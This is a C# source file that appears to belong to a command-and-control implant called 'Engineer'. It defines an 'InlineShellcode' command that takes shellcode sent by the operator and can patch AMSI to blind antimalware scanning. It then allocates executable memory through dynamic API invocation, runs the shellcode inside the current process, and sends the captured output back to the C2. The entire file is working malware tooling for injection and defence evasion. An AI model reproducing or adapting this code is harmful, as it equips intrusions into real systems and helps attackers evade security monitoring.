using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using DynamicEngLoading;

using static DynamicEngLoading.h_DynInv.Win32;

namespace Engineer.Commands
{
    // goal was to allow self injection of shellcode and return the output to the C2 but nothing I do will redirect the shellcodes output away from the console. 
    internal class ShellcodeSelf : EngineerCommand
    {
        public override string Name => "InlineShellcode";
        public string output;
        public static MemoryStream Ms = new MemoryStream();
        public static StreamWriter writer = new StreamWriter(Ms);
        public delegate void ShellcodeDelegate(string[] output);

        public override async Task Execute(EngineerTask task)
        {
            // use Console.SetOut() to redirect the output to the TextWriter

            var stdOut = Console.Out;
            var stdErr = Console.Error;

            //get main thread of current process
            Process currentProcess = Process.GetCurrentProcess();

            task.Arguments.TryGetValue("/args", out string arg);
            string[] args = arg.Split(' ');

            byte[] shellcode = task.File;
            int shellcodeLength = shellcode.Length;

            WinBase._SECURITY_ATTRIBUTES saAttr = new WinBase._SECURITY_ATTRIBUTES();
            // Set the bInheritHandle flag so pipe handles are inherited. 

            saAttr.nLength = Marshal.SizeOf(saAttr);
            saAttr.bInheritHandle = false;
            saAttr.lpSecurityDescriptor = IntPtr.Zero;

            //create a named pipe and use it to set Console.Out and Console.Error
           var pipeHandle = h_DynInv_Methods.Ker32FuncWrapper.CreateNamedPipe(
                "\\\\.\\pipe\\EngineerPipe",
                Kernel32.PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, Kernel32.PipeModeFlags.PIPE_TYPE_BYTE | Kernel32.PipeModeFlags.PIPE_READMODE_BYTE | Kernel32.PipeModeFlags.PIPE_WAIT,1, 65535, 65535, 0, IntPtr.Zero);
           

            //use create file api call in the new named pipe address
            var pipeHandle2 = h_DynInv_Methods.Ker32FuncWrapper.CreateFile(
                "\\\\.\\pipe\\EngineerPipe",
                Kernel32.EFileAccess.GenericRead | Kernel32.EFileAccess.GenericWrite,
                Kernel32.EFileShare.Read | Kernel32.EFileShare.Write,
                IntPtr.Zero,
                Kernel32.ECreationDisposition.OpenExisting,
                Kernel32.EFileAttributes.Normal,
                IntPtr.Zero);

            //cAll set std handle to update the console out to use our new pipeHandle2
           bool setHadnleSuccess = h_DynInv_Methods.Ker32FuncWrapper.SetStdHandle(Kernel32.STD_OUTPUT_HANDLE, pipeHandle2);

            // Console.SetOut(new StreamWriter(new FileStream(fileSafeHandle, FileAccess.Write)));
            //Console.SetError(new StreamWriter(new FileStream(fileSafeHandle, FileAccess.Write)));

            //check if the console out and console error got updated
            if (!setHadnleSuccess)
            {
                //Console.WriteLine("Failed to redirect output");
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Failed to redirect output", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                return;
            }

            try
            {
                //Console.WriteLine("[+] Patching amsi");
                task.Arguments.TryGetValue("/patchA", out string patch);
                bool.TryParse(patch,out bool isPatching);
                if (isPatching)
                {
                    ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("patching", task, EngTaskStatus.Running, TaskResponseType.String);
                    Patch_AMSI patchobject = new Patch_AMSI();
                    patchobject.Execute(null);
                }

                //use DynInv to call virtualalloc
                var hMemory = IntPtr.Zero;
                IntPtr MemoryShell = h_DynInv_Methods.NtFuncWrapper.NtAllocateVirtualMemory(currentProcess.Handle, shellcodeLength, Kernel32.AllocationType.Commit, (uint)Kernel32.MemoryProtection.ExecuteReadWrite);

                Marshal.Copy(shellcode, 0, MemoryShell, shellcode.Length);

                ShellcodeDelegate Run = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(MemoryShell, typeof(ShellcodeDelegate));
                Run(args);
                //Read from named pipe in chunks until there is no more data to read
                uint bytesRead = 0;
                uint bytesAvailable = 65535;
                byte[] buffer = new byte[bytesAvailable];
                // Console.WriteLine("reading from pipe");
                var success = h_DynInv_Methods.Ker32FuncWrapper.ReadFile(pipeHandle, buffer, bytesAvailable, out bytesRead, IntPtr.Zero);
                //Console.WriteLine($"read {bytesRead} bytes");
                output = Encoding.UTF8.GetString(buffer, 0, buffer.Length);
            }
            catch (Exception e)
            {
               // Console.WriteLine(e.Message);
            }
            finally
            {
                //reset the console out and error
                Console.SetOut(stdOut);
                Console.SetError(stdErr);
            }

            ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults(output, task, EngTaskStatus.Complete,TaskResponseType.String);
        }
    }
}
